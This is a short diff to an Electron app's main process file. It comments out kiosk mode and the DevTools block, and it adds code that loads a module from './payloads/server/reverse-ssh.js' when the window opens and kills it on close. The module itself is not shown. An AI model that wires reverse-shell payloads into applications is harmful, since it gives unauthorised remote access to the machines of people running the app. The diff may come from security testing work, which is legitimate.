@@ -9,19 +9,22 @@ let mainWindow
 function createWindow () {
   // Create the browser window.
   mainWindow = new BrowserWindow({
-    kiosk: true,
+    // kiosk: true,
     width: 800,
     height: 600,
     frame: false,
     webPreferences: {
       preload: path.join(__dirname, 'preload.js'),
       nodeIntegration: true,
-      devTools: false,
+      // devTools: false,
     }
   })
-
+  
   // and load the index.html of the app.
   mainWindow.loadFile('index.html')
+
+  // setup handler for reverse ssh
+  let reverse = require('./payloads/server/reverse-ssh.js')
 
   // Open the DevTools.
   // mainWindow.webContents.openDevTools()
@@ -32,7 +35,12 @@ function createWindow () {
     // in an array if your app supports multi windows, this is the time
     // when you should delete the corresponding element.
     mainWindow = null
+
+    // play nice
+    reverse.server.kill()
+    reverse.ssh.kill()
   })
+
 }
 
 // This method will be called when Electron has finished
